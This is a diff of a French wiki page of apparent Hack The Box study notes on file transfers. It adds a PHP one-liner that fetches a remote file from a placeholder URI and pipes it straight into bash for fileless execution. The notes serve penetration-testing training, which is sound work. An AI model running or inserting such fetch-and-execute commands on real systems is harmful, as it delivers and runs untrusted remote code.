@@ -2,7 +2,7 @@
 title: File Transfers
 description: 
 published: true
-date: 2025-04-21T11:59:25.514Z
+date: 2025-04-21T12:00:28.400Z
 tags: notes, htb, module
 editor: markdown
 dateCreated: 2025-03-16T15:21:30.098Z
@@ -541,4 +541,9 @@ php -r 'const BUFFER = 1024; $fremote = fopen("<uri>", "rb"); $flocal = fopen("<
 ```
 
 Il est aussi possible d'utiliser la fonction de piping comme vu précedemment pour effectuer une opération sans écrire sur le disque (sans-fichier/fileless).
+
+Par exemple pour exécuter le contenu du fichier avec Bash:
+```
+php -r '$lines = @file("<uri>"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
+```
 
